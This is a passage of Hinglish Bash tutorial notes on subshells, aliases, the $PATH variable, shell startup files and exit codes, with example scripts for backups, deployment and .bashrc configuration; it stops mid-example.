### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Database backup with subshells

set -euo pipefail

readonly BACKUP_DIR="/backups"
readonly LOG_FILE="/var/log/backup.log"

cleanup() {
    local exit_code=$?
    echo "Exit code: $exit_code" >> "$LOG_FILE"
    
    if [ $exit_code -ne 0 ]; then
        echo "Backup failed!" | mail -s "Backup Error" admin@example.com
    fi
}

trap cleanup EXIT

# Parallel backups in subshells
(
    echo "Backing up database 1..."
    mysqldump db1 | gzip > "$BACKUP_DIR/db1.sql.gz"
) &

(
    echo "Backing up database 2..."
    mysqldump db2 | gzip > "$BACKUP_DIR/db2.sql.gz"
) &

(
    echo "Backing up database 3..."
    mysqldump db3 | gzip > "$BACKUP_DIR/db3.sql.gz"
) &

# Wait for all
wait

# Check results
if [ $? -eq 0 ]; then
    echo "✓ All backups successful"
    exit 0
else
    echo "✗ Some backups failed"
    exit 1
fi
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `( )` explicit subshell
- ✅ `&` background subshell
- ✅ `exit 0` success
- ✅ `exit 1-255` errors
- ✅ `trap` cleanup on exit

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: Subshell mein `exit` kya karta hai?**
A: Sirf subshell exit hota hai, parent shell nahi.

**Q2: Variables subshell se parent mein kaise pass karu?**
A: File ya pipe use karo, direct nahi ho sakta.

**Q3: Exit code range kya hai?**
A: 0-255. 0=success, 1-255=errors.

### 14. **Practice ke liye Task**

```bash
# 1. Subshell test
VAR="parent"
( VAR="child"; echo $VAR )
echo $VAR

# 2. Exit test
#!/bin/bash
[ $# -eq 0 ] && exit 1
echo "Args: $@"
exit 0

# 3. Background subshell
( sleep 2; echo "Done" ) &
echo "Started background job"
wait
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🔒 Subshells isolated environments
- 🚪 `exit` terminates script/shell
- 🔢 Exit codes: 0=success, 1-255=errors
- 🧹 `trap` cleanup on exit
- ⚡ Background jobs = subshells

> **💡 Ye Zaroor Yaad Rakhein:**
> Subshells isolated hain - variables persist nahi hote! Exit codes meaningful rakho (0=success), aur cleanup ke liye `trap` use karo!

---

## **Topic 4: `alias` & `type` commands**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**alias & type** - Shortcuts banana aur commands inspect karna.

### 2. **Ye Kya Hai? (What is it?)**
`alias` command shortcuts banata hai long commands ke liye. `type` command batata hai ki koi command kya hai - builtin, alias, function, ya external.

**Analogy:** Alias ek nickname hai - "Bob" ki jagah "Robert" bolne ki zaroorat nahi. Type ek detective hai jo batata hai command ka asli identity kya hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Productivity** - Shortcuts save time
- ✅ **Convenience** - Common commands easy
- ✅ **Debugging** - Command type pata karo
- ✅ **Customization** - Personal workflow

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Frequent commands
- Long commands
- Personal shortcuts
- Debugging commands

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Repetitive typing
- Time waste
- Command confusion
- Poor productivity

### 6. **Syntax aur Common Options**

```bash
# Create alias
alias name='command'
alias ll='ls -lah'

# List aliases
alias

# Remove alias
unalias name

# Type command
type command
type -a command    # All definitions
type -t command    # Type only
```

### 7. **Example 1 (Basic)**

```bash
# Create aliases
alias ll='ls -lah'
alias la='ls -A'
alias l='ls -CF'

# Use alias
ll

# Check type
type ll
# Output: ll is aliased to `ls -lah'

type ls
# Output: ls is /bin/ls

# Remove alias
unalias ll
```

### 8. **Example 2 (Advanced/Script)**

```bash
# .bashrc - Common aliases

# Navigation
alias ..='cd ..'
alias ...='cd ../..'
alias ....='cd ../../..'

# Listing
alias ll='ls -lah'
alias la='ls -A'
alias l='ls -CF'

# Safety
alias rm='rm -i'
alias cp='cp -i'
alias mv='mv -i'

# Git shortcuts
alias gs='git status'
alias ga='git add'
alias gc='git commit'
alias gp='git push'
alias gl='git log --oneline'

# System
alias update='sudo apt update && sudo apt upgrade'
alias ports='netstat -tulanp'
alias meminfo='free -h'
alias diskinfo='df -h'

# Docker
alias dps='docker ps'
alias dimg='docker images'
alias dex='docker exec -it'

# Custom functions as aliases
alias myip='curl -s ifconfig.me'
alias weather='curl wttr.in'

# Type checking function
check_command() {
    local cmd=$1
    echo "Checking: $cmd"
    type -a "$cmd"
}

alias check='check_command'
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Quotes bhoolna:** `alias ll=ls -la` galat
- ❌ **Spaces around `=`:** `alias ll = 'ls'` galat
- ❌ **Scripts mein aliases:** Non-interactive shells mein kaam nahi karte

### 10. **Best Practices / Pro Tips**
- 💡 **`.bashrc` mein rakho:** Permanent aliases
- 💡 **Meaningful names:** Short but clear
- 💡 **Safety aliases:** `rm -i`, `cp -i`
- 💡 **`type` use karo:** Command inspect karne ke liye

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
# .bash_aliases - Professional aliases

# Development
alias dev='cd ~/projects && code .'
alias serve='python3 -m http.server 8000'
alias test='npm test'
alias build='npm run build'

# Docker development
alias dcu='docker-compose up -d'
alias dcd='docker-compose down'
alias dcl='docker-compose logs -f'
alias dcr='docker-compose restart'

# Database
alias pgstart='sudo systemctl start postgresql'
alias pgstop='sudo systemctl stop postgresql'
alias pgstatus='sudo systemctl status postgresql'

# Logs
alias logs='tail -f /var/log/syslog'
alias applogs='tail -f /var/log/myapp/app.log'
alias errorlogs='tail -f /var/log/myapp/error.log'

# Backup
alias backup='rsync -avz --progress'
alias backup-home='backup ~/ /backups/home/'

# Network
alias myip='curl -s ifconfig.me && echo'
alias localip='hostname -I'
alias ports='ss -tulanp'

# System monitoring
alias cpu='top -o %CPU'
alias mem='top -o %MEM'
alias disk='df -h | grep -v tmpfs'

# Git workflow
alias gst='git status'
alias gco='git checkout'
alias gcb='git checkout -b'
alias gpl='git pull'
alias gps='git push'
alias glog='git log --oneline --graph --decorate'
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `alias name='command'` create
- ✅ `alias` list all
- ✅ `unalias name` remove
- ✅ `type command` inspect
- ✅ `.bashrc` mein permanent

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: Aliases scripts mein kaam karte hain?**
A: Nahi, sirf interactive shells mein. Scripts mein functions use karo.

**Q2: Alias ko temporarily disable kaise karu?**
A: Backslash use karo: `\ls` (alias bypass)

**Q3: Alias mein alias use kar sakte hain?**
A: Haan, lekin circular references avoid karo.

### 14. **Practice ke liye Task**

```bash
# 1. Create aliases
alias ll='ls -lah'
alias gs='git status'

# 2. Use them
ll
gs

# 3. Check type
type ll
type ls
type cd

# 4. List all aliases
alias

# 5. Remove
unalias ll

# 6. Add to .bashrc
echo "alias ll='ls -lah'" >> ~/.bashrc
source ~/.bashrc
```

### 15. **Aakhri Choti Summary (5 lines)**
- ⚡ Aliases shortcuts for commands
- 📝 `.bashrc` mein permanent
- 🔍 `type` command inspect karta hai
- 🚫 Scripts mein kaam nahi karte
- 💡 Productivity booster

> **💡 Ye Zaroor Yaad Rakhein:**
> Aliases productivity ka secret weapon hain! `.bashrc` mein rakho, meaningful names do, aur `type` se commands inspect karo. Scripts mein functions use karo!

---

## **Topic 5: The `$PATH` Variable (`echo $PATH`, `whereis`, Adding to PATH, `export`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**$PATH Variable** - System ko batana ki executables kahan dhoondhni hain.

### 2. **Ye Kya Hai? (What is it?)**
`$PATH` ek environment variable hai jo colon-separated directories ki list hai jahan system executables dhoondhta hai. Jab aap command type karte hain, system `$PATH` mein listed directories check karta hai.

**Analogy:** `$PATH` ek address book hai jahan system commands dhoondhta hai - jaise phone book mein numbers dhoondhte hain.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Command execution** - Bina full path ke
- ✅ **Custom tools** - Apne scripts add karo
- ✅ **System configuration** - Environment setup
- ✅ **Development** - Local binaries

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Custom scripts install karte waqt
- Development tools setup
- System configuration
- Command not found errors

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Commands not found
- Full paths type karne padenge
- Custom tools use nahi kar paoge
- Poor development experience

### 6. **Syntax aur Common Options**

```bash
# View PATH
echo $PATH

# Find command location
which command
whereis command
type command

# Add to PATH (temporary)
export PATH="$PATH:/new/directory"

# Add to PATH (permanent - .bashrc)
export PATH="$HOME/bin:$PATH"

# Check if directory in PATH
echo $PATH | grep -q "/my/dir" && echo "Found"
```

### 7. **Example 1 (Basic)**

```bash
# View current PATH
$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin

# Find command
$ which ls
/bin/ls

$ whereis bash
bash: /bin/bash /usr/share/man/man1/bash.1.gz

# Add directory temporarily
$ export PATH="$PATH:$HOME/scripts"
$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/home/user/scripts
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# PATH management script

show_path() {
    echo "Current PATH:"
    echo "$PATH" | tr ':' '\n' | nl
}

check_command() {
    local cmd=$1
    
    if command -v "$cmd" &>/dev/null; then
        echo "✓ $cmd found at: $(which $cmd)"
    else
        echo "✗ $cmd not found in PATH"
    fi
}

add_to_path() {
    local dir=$1
    
    if [ ! -d "$dir" ]; then
        echo "✗ Directory not found: $dir"
        return 1
    fi
    
    if echo "$PATH" | grep -q "$dir"; then
        echo "⚠️  Already in PATH: $dir"
        return 0
    fi
    
    export PATH="$dir:$PATH"
    echo "✓ Added to PATH: $dir"
}

remove_from_path() {
    local dir=$1
    PATH=$(echo "$PATH" | sed -e "s|:$dir||g" -e "s|$dir:||g" -e "s|$dir||g")
    export PATH
    echo "✓ Removed from PATH: $dir"
}

# Setup development environment
setup_dev_env() {
    echo "Setting up development environment..."
    
    # Add custom bin directories
    add_to_path "$HOME/bin"
    add_to_path "$HOME/.local/bin"
    add_to_path "$HOME/scripts"
    
    # Add language-specific paths
    add_to_path "$HOME/.cargo/bin"      # Rust
    add_to_path "$HOME/.npm-global/bin" # Node.js
    add_to_path "$HOME/go/bin"          # Go
    
    echo ""
    echo "Development tools:"
    check_command "node"
    check_command "python3"
    check_command "go"
    check_command "cargo"
}

setup_dev_env
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Overwrite PATH:** `PATH=/new/dir` galat, `PATH=$PATH:/new/dir` sahi
- ❌ **Quotes bhoolna:** Spaces wale paths ke liye quotes
- ❌ **Permanent vs temporary:** `.bashrc` mein add karo permanent ke liye

### 10. **Best Practices / Pro Tips**
- 💡 **Prepend vs append:** Important dirs pehle: `$HOME/bin:$PATH`
- 💡 **`.bashrc` mein:** Permanent changes
- 💡 **Check existence:** Directory exists check karo
- 💡 **Avoid duplicates:** Pehle check karo already hai ya nahi

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
# .bashrc - PATH configuration

# Custom scripts directory
if [ -d "$HOME/bin" ]; then
    export PATH="$HOME/bin:$PATH"
fi

# Local installations
if [ -d "$HOME/.local/bin" ]; then
    export PATH="$HOME/.local/bin:$PATH"
fi

# Development tools
if [ -d "$HOME/scripts" ]; then
    export PATH="$HOME/scripts:$PATH"
fi

# Node.js global packages
if [ -d "$HOME/.npm-global/bin" ]; then
    export PATH="$HOME/.npm-global/bin:$PATH"
fi

# Rust cargo
if [ -d "$HOME/.cargo/bin" ]; then
    export PATH="$HOME/.cargo/bin:$PATH"
fi

# Go binaries
if [ -d "$HOME/go/bin" ]; then
    export PATH="$HOME/go/bin:$PATH"
fi

# Python user packages
if [ -d "$HOME/.local/bin" ]; then
    export PATH="$HOME/.local/bin:$PATH"
fi

# Custom function to add to PATH safely
add_to_path() {
    if [ -d "$1" ] && [[ ":$PATH:" != *":$1:"* ]]; then
        export PATH="$1:$PATH"
    fi
}

# Use function
add_to_path "$HOME/custom/bin"
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `echo $PATH` view karo
- ✅ `which cmd` location find karo
- ✅ `export PATH="$PATH:/dir"` add karo
- ✅ `.bashrc` permanent ke liye
- ✅ Duplicates avoid karo

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: PATH mein order matter karta hai?**
A: Haan! Pehli matching command execute hoti hai.

**Q2: PATH permanently kaise change karu?**
A: `.bashrc` ya `.bash_profile` mein add karo.

**Q3: PATH reset kaise karu?**
A: New shell open karo ya `source ~/.bashrc`

### 14. **Practice ke liye Task**

```bash
# 1. View PATH
echo $PATH

# 2. Find command
which bash
whereis ls

# 3. Add directory (temporary)
export PATH="$PATH:$HOME/test"

# 4. Verify
echo $PATH

# 5. Add to .bashrc (permanent)
echo 'export PATH="$HOME/bin:$PATH"' >> ~/.bashrc
source ~/.bashrc

# 6. Check if in PATH
echo $PATH | grep "$HOME/bin"
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🛣️ `$PATH` command search directories
- 🔍 `which`/`whereis` location find karo
- ➕ `export PATH="$PATH:/dir"` add karo
- 📝 `.bashrc` permanent changes
- ⚠️ Order matters, duplicates avoid

> **💡 Ye Zaroor Yaad Rakhein:**
> PATH ko kabhi overwrite mat karo! Hamesha `$PATH:/new/dir` use karo. Important directories pehle rakho, aur `.bashrc` mein permanent changes karo!

---

## **Topic 6: Shell Startup Files (`.bashrc`, `.bash_profile`, `.profile`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Shell Startup Files** - Shell start hone par automatically execute hone wali files.

### 2. **Ye Kya Hai? (What is it?)**
Shell startup files woh configuration files hain jo shell start hone par automatically execute hoti hain. Different files different scenarios mein load hoti hain - login shell, non-login shell, interactive, non-interactive.

**Analogy:** Startup files ek morning routine hain - jaise aap uthte hi kuch specific kaam karte hain (brush, coffee), waise hi shell start hote hi yeh files execute hoti hain.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Environment setup** - Automatic configuration
- ✅ **Aliases & functions** - Personal shortcuts
- ✅ **PATH configuration** - Custom directories
- ✅ **Customization** - Personal workflow

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Environment variables set karna
- Aliases define karna
- PATH modify karna
- Custom functions add karna

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Manual configuration har baar
- Inconsistent environment
- Lost productivity
- Poor customization

### 6. **Syntax aur Common Options**

```bash
# Login shell (SSH, console login)
~/.bash_profile    # First choice
~/.bash_login      # If profile not found
~/.profile         # If neither found

# Non-login interactive shell (new terminal)
~/.bashrc

# Logout
~/.bash_logout

# Common pattern in .bash_profile
if [ -f ~/.bashrc ]; then
    source ~/.bashrc
fi
```

### 7. **Example 1 (Basic)**

```bash
# .bashrc - Interactive non-login shell
# Aliases
alias ll='ls -lah'
alias gs='git status'

# Environment variables
export EDITOR=vim
export VISUAL=vim

# Custom prompt
PS1='\u@\h:\w\$ '

# History settings
HISTSIZE=10000
HISTFILESIZE=20000

# .bash_profile - Login shell
# Source .bashrc
if [ -f ~/.bashrc ]; then
    source ~/.bashrc
fi

# Login-specific settings
echo "Welcome, $USER!"
```

### 8. **Example 2 (Advanced/Script)**

```bash
# .bashrc - Comprehensive configuration

# ============================================
# ENVIRONMENT VARIABLES
# ============================================
export EDITOR=vim
export VISUAL=vim
export PAGER=less
export BROWSER=firefox

# Language
export LANG=en_US.UTF-8
export LC_ALL=en_US.UTF-8

# History
export HISTSIZE=10000
export HISTFILESIZE=20000
export HISTCONTROL=ignoredups:erasedups
export HISTTIMEFORMAT="%Y-%m-%d %H:%M:%S "

# ============================================
# PATH CONFIGURATION
# ============================================
# Custom scripts
[ -d "$HOME/bin" ] && export PATH="$HOME/bin:$PATH"
[ -d "$HOME/.local/bin" ] && export PATH="$HOME/.local/bin:$PATH"

# Development tools
[ -d "$HOME/.cargo/bin" ] && export PATH="$HOME/.cargo/bin:$PATH"
[ -d "$HOME/go/bin" ] && export PATH="$HOME/go/bin:$PATH"

# ============================================
# ALIASES
# ============================================
# Navigation
alias ..='cd ..'
alias ...='cd ../..'
alias ....='cd ../../..'

# Listing
alias ll='ls -lah'
alias la='ls -A'
alias l='ls -CF'

# Safety
alias rm='rm -i'
alias cp='cp -i'
alias mv='mv -i'

# Git
alias gs='git status'
alias ga='git add'
alias gc='git commit'
alias gp='git push'
alias gl='git log --oneline'

# System
alias update='sudo apt update && sudo apt upgrade'
alias ports='ss -tulanp'

# ============================================
# FUNCTIONS
# ============================================
# Create directory and cd into it
mkcd() {
    mkdir -p "$1" && cd "$1"
}

# Extract archives
extract() {
    if [ -f "$1" ]; then
        case "$1" in
            *.tar.gz)  tar xzf "$1"   ;;
            *.tar.bz2) tar xjf "$1"   ;;
            *.zip)     unzip "$1"     ;;
            *.gz)      gunzip "$1"    ;;
            *)         echo "Unknown format" ;;
        esac
    fi
}

# Quick backup
backup() {
    cp "$1" "$1.backup.$(date +%Y%m%d_%H%M%S)"
}

# ============================================
# PROMPT CUSTOMIZATION
# ============================================
# Colors
RED='\[\033[01;31m\]'
GREEN='\[\033[01;32m\]'
YELLOW='\[\033[01;33m\]'
BLUE='\[\033[01;34m\]'
RESET='\[\033[00m\]'

# Git branch in prompt
parse_git_branch() {
    git branch 2>/dev/null | grep '*' | sed 's/* //'
}

# Custom prompt
PS1="${GREEN}\u@\h${RESET}:${BLUE}\w${YELLOW}\$(parse_git_branch)${RESET}\$ "

# ============================================
# COMPLETION
# ============================================
if [ -f /etc/bash_completion ]; then
    source /etc/bash_completion
fi

# ============================================
# CUSTOM SETTINGS
# ============================================
# Load local settings if exists
[ -f ~/.bashrc.local ] && source ~/.bashrc.local

# Load work-specific settings
[ -f ~/.bashrc.work ] && source ~/.bashrc.work
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Wrong file:** `.bashrc` vs `.bash_profile` confuse
- ❌ **Syntax errors:** Shell start nahi hoga
- ❌ **Infinite loops:** Circular sourcing

### 10. **Best Practices / Pro Tips**
- 💡 **`.bashrc` for most:** Aliases, functions, prompt
- 💡 **`.bash_profile` minimal:** Just source `.bashrc`
- 💡 **Backup:** Pehle backup lo
- 💡 **Test:** Syntax check karo

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
# .bash_profile - Login shell
# Source .bashrc for consistency
if [ -f ~/.bashrc ]; then
    source ~/.bashrc
fi

# Login message
echo "Welcome back, $USER!"
echo "Last login: $(last -1 $USER | head -1 | awk '{print $4, $5, $6, $7}')"

# Check for updates
if [ -f /var/run/reboot-required ]; then
    echo "⚠️  System restart required"
fi

# .bashrc - Main configuration
# Environment
export EDITOR=vim
export PATH="$HOME/bin:$PATH"

# Aliases
alias ll='ls -lah'
alias gs='git status'

# Functions
mkcd() { mkdir -p "$1" && cd "$1"; }

# Prompt
PS1='\u@\h:\w\$ '

# .bashrc.local - Machine-specific (not in git)
# Work laptop specific
export WORK_EMAIL="user@company.com"
alias vpn='sudo openvpn /etc/openvpn/work.conf'

# .bash_logout - Cleanup on logout
# Clear screen
clear

# Remove temporary files
rm -f /tmp/temp_*

# Log logout
echo "$(date): $USER logged out" >> ~/.logout.log
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `.bashrc` - Interactive shells
- ✅ `.bash_profile` - Login shells
- ✅ `.profile` - POSIX alternative
- ✅ Source `.bashrc` from profile
- ✅ Backup before editing

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: `.bashrc` vs `.bash_profile` kab use karu?**
A: `.bashrc` mein sab rakho, `.bash_profile` mein sirf `.bashrc` source karo.

**Q2: Changes apply kaise karu bina logout ke?**
A: `source ~/.bashrc` ya `. ~/.bashrc`

**Q3: Syntax error ho gaya toh?**
A: New terminal se backup restore karo ya `/bin/bash --norc`

### 14. **Practice ke liye Task**

```bash
# 1. Backup current files
cp ~/.bashrc ~/.bashrc.backup
cp ~/.bash_profile ~/.bash_profile.backup

# 2. Add alias to .bashrc
echo "alias ll='ls -lah'" >> ~/.bashrc

# 3. Apply changes
source ~/.bashrc

# 4. Test
ll

# 5. View files
cat ~/.bashrc
cat ~/.bash_profile

# 6. Restore if needed
# cp ~/.bashrc.backup ~/.bashrc
```

### 15. **Aakhri Choti Summary (5 lines)**
- 📁 `.bashrc` main configuration file
- 🔐 `.bash_profile` login shells
- 🔄 Source `.bashrc` from profile
- 💾 Backup before editing
- ✅ `source` to apply changes

> **💡 Ye Zaroor Yaad Rakhein:**
> `.bashrc` mein sab configuration rakho! `.bash_profile` mein sirf `.bashrc` source karo. Backup hamesha lo, aur `source` se changes apply karo!

---

# **🎉 Module 11 Complete! 🎉**

Congratulations! Aapne **Module 11: The Shell Environment** successfully complete kar liya hai!

## **Aapne Kya Seekha:**
✅ **Shebang** - `#!/bin/bash`
✅ **Running Scripts** - `bash` vs `source` vs `./`
✅ **Subshells** - Isolation & `exit`
✅ **alias & type** - Shortcuts & inspection
✅ **$PATH** - Command search path
✅ **Startup Files** - `.bashrc`, `.bash_profile`

## **Key Concepts:**

```bash
# Shebang
#!/bin/bash

# Execution methods
bash script.sh      # Subshell
./script.sh         # Executable
source script.sh    # Current shell

# Aliases
alias ll='ls -lah'

# PATH
export PATH="$HOME/bin:$PATH"

# Startup files
# .bash_profile
if [ -f ~/.bashrc ]; then
    source ~/.bashrc
fi
```

## **Best Practices:**
- Shebang hamesha pehli line
- Config files: `source` use karo
- Aliases `.bashrc` mein
- PATH ko overwrite mat karo
- Startup files backup lo

## **Next Steps:**
Ab aap ready hain **Module 12: Robust Scripting & Error Handling** ke liye!

---

=============================================================

# **Bash Shell Scripting: Zero-to-Automation Notes (Module 12)**

---

## **PART 3: BUILDING REAL SCRIPTS**

---

# **Module 12: Robust Scripting & Error Handling**

---

## **Topic 1: Exit Status (`$?`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Exit Status** - Har command ka return code jo success ya failure batata hai.

### 2. **Ye Kya Hai? (What is it?)**
Exit status ek number hai (0-255) jo har command execute hone ke baad return hota hai. `$?` special variable hai jo last command ka exit status store karta hai. `0` matlab success, non-zero matlab error.

**Analogy:** Exit status ek report card hai - 0 matlab pass (success), koi bhi aur number matlab fail (error with specific reason).

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Error detection** - Command success/failure check
- ✅ **Flow control** - Conditional execution
- ✅ **Debugging** - Problem identification
- ✅ **Automation** - Reliable scripts

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Command success verify karna
- Error handling logic
- Conditional execution
- Script debugging

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Silent failures
- Unreliable scripts
- Data corruption
- Production issues

### 6. **Syntax aur Common Options**

```bash
# Check exit status
command
echo $?

# Common exit codes
0     # Success
1     # General error
2     # Misuse of shell command
126   # Command cannot execute
127   # Command not found
130   # Terminated by Ctrl+C
```

### 7. **Example 1 (Basic)**

```bash
# Success case
ls /home
echo $?
# Output: 0

# Failure case
ls /nonexistent
echo $?
# Output: 2

# Using in conditions
if ls /home > /dev/null 2>&1; then
    echo "Directory exists"
else
    echo "Directory not found"
fi

# Check and act
grep "pattern" file.txt
if [ $? -eq 0 ]; then
    echo "Pattern found"
else
    echo "Pattern not found"
fi
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Robust script with exit status checking

set -euo pipefail

readonly LOG_FILE="/var/log/backup.log"
readonly BACKUP_DIR="/backups"

log_message() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

check_status() {
    local status=$?
    local command=$1
    
    if [ $status -eq 0 ]; then
        log_message "✓ $command succeeded"
        return 0
    else
        log_message "✗ $command failed with exit code: $status"
        return $status
    fi
}

# Backup function with status checking
backup_database() {
    local db_name=$1
    local backup_file="$BACKUP_DIR/${db_name}_$(date +%Y%m%d).sql.gz"
    
    log_message "Starting backup of $db_name..."
    
    # Attempt backup
    mysqldump "$db_name" | gzip > "$backup_file"
    check_status "Database backup"
    
    # Verify backup file
    if [ -f "$backup_file" ] && [ -s "$backup_file" ]; then
        log_message "✓ Backup file created: $backup_file"
        return 0
    else
        log_message "✗ Backup file verification failed"
        return 1
    fi
}

# Main execution
main() {
    # Check prerequisites
    command -v mysqldump >/dev/null 2>&1
    if [ $? -ne 0 ]; then
        log_message "✗ mysqldump not found"
        exit 127
    fi
    
    # Create backup directory
    mkdir -p "$BACKUP_DIR"
    check_status "Create backup directory" || exit 1
    
    # Perform backups
    for db in db1 db2 db3; do
        backup_database "$db"
        local result=$?
        
        if [ $result -ne 0 ]; then
            log_message "⚠️  Backup failed for $db, continuing..."
        fi
    done
    
    log_message "Backup process completed"
}

main "$@"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **`$?` overwrite:** Next command se pehle save karo
- ❌ **Ignore karna:** Hamesha check karo critical commands
- ❌ **Wrong comparison:** `[ $? -eq 0 ]` use karo, not `[ $? == 0 ]`

### 10. **Best Practices / Pro Tips**
- 💡 **Immediately check:** `$?` next command se overwrite hota hai
- 💡 **Save if needed:** `status=$?` pehle save karo
- 💡 **Use `set -e`:** Auto-exit on error
- 💡 **Meaningful codes:** Different errors ke liye different codes

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Production deployment script with comprehensive error checking

set -euo pipefail

readonly APP_NAME="myapp"
readonly DEPLOY_DIR="/var/www/$APP_NAME"
readonly BACKUP_DIR="/backups/$APP_NAME"

deploy() {
    echo "Starting deployment..."
    
    # Backup current version
    echo "Creating backup..."
    tar -czf "$BACKUP_DIR/backup_$(date +%Y%m%d_%H%M%S).tar.gz" "$DEPLOY_DIR"
    
    if [ $? -eq 0 ]; then
        echo "✓ Backup created successfully"
    else
        echo "✗ Backup failed, aborting deployment"
        return 1
    fi
    
    # Pull latest code
    echo "Pulling latest code..."
    cd "$DEPLOY_DIR"
    git pull origin main
    local git_status=$?
    
    if [ $git_status -ne 0 ]; then
        echo "✗ Git pull failed with code: $git_status"
        echo "Rolling back..."
        # Restore backup logic here
        return 1
    fi
    
    # Install dependencies
    echo "Installing dependencies..."
    npm install --production
    
    if [ $? -eq 0 ]; then
        echo "✓ Dependencies installed"
    else
        echo "✗ Dependency installation failed"
        return 1
    fi
    
    # Run tests
    echo "Running tests..."
    npm test
    local test_status=$?
    
    if [ $test_status -eq 0 ]; then
        echo "✓ All tests passed"
    else
        echo "✗ Tests failed with code: $test_status"
        return 1
    fi
    
    # Restart service
    echo "Restarting service..."
    systemctl restart "$APP_NAME"
    
    if [ $? -eq 0 ]; then
        echo "✓ Service restarted successfully"
        echo "✓ Deployment completed successfully"
        return 0
    else
        echo "✗ Service restart failed"
        return 1
    fi
}

# Execute deployment
deploy
exit_code=$?

if [ $exit_code -eq 0 ]; then
    echo "🎉 Deployment successful!"
    exit 0
else
    echo "❌ Deployment failed with exit code: $exit_code"
    exit $exit_code
fi
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `$?` last command ka exit status
- ✅ `0` = success, non-zero = error
- ✅ Immediately check karo
- ✅ Save if needed: `status=$?`
- ✅ Critical commands hamesha check

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: `$?` kab overwrite hota hai?**
A: Har command ke baad. Immediately check ya save karo.

**Q2: Exit code 127 ka matlab kya hai?**
A: Command not found.

**Q3: Multiple commands ka status kaise check karu?**
A: Har command ke baad save karo: `status1=$?`

### 14. **Practice ke liye Task**

```bash
# 1. Basic check
ls /home
echo "Exit status: $?"

# 2. Save and use
grep "test" file.txt
status=$?
echo "Grep returned: $status"

# 3. Conditional
if ping -c 1 google.com > /dev/null 2>&1; then
    echo "Network OK"
else
    echo "Network failed: $?"
fi

# 4. Script
#!/bin/bash
command1
[ $? -eq 0 ] || exit 1
command2
[ $? -eq 0 ] || exit 2
echo "All commands succeeded"
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🔢 `$?` stores last exit status
- ✅ 0 = success, 1-255 = errors
- ⚡ Check immediately (overwrites)
- 💾 Save if needed: `status=$?`
- 🎯 Critical for error handling

> **💡 Ye Zaroor Yaad Rakhein:**
> `$?` har command ke baad overwrite hota hai! Immediately check karo ya save karo. 0 = success, baaki sab errors. Production scripts mein hamesha check karo!

---

## **Topic 2: Script Exit Codes (`exit 0`, `exit 1`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Script Exit Codes** - Apni script ka status return karna.

### 2. **Ye Kya Hai? (What is it?)**
`exit` command script ko terminate karta hai aur ek exit code return karta hai. `exit 0` success indicate karta hai, `exit 1` (ya koi non-zero) error indicate karta hai. Yeh calling script/process ko batata hai ki script successful rahi ya nahi.

**Analogy:** Exit code ek final report hai jo aap apne boss ko dete hain - "Kaam ho gaya (0)" ya "Problem aayi (1-255)".

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Communication** - Calling process ko status batana
- ✅ **Automation** - CI/CD pipelines
- ✅ **Error handling** - Proper failure indication
- ✅ **Debugging** - Problem identification

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Script completion par
- Error conditions mein
- Early termination
- Automation scripts

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Unclear script status
- Automation failures
- Silent errors
- Pipeline issues

### 6. **Syntax aur Common Options**

```bash
# Exit with status
exit 0          # Success
exit 1          # General error
exit 2          # Misuse
exit 127        # Command not found
exit 130        # Terminated by Ctrl+C

# Exit with last command status
exit $?

# Common convention
0     # Success
1     # General error
2     # Misuse of command
64-78 # Custom error codes
```

### 7. **Example 1 (Basic)**

```bash
#!/bin/bash
# Simple script with exit codes

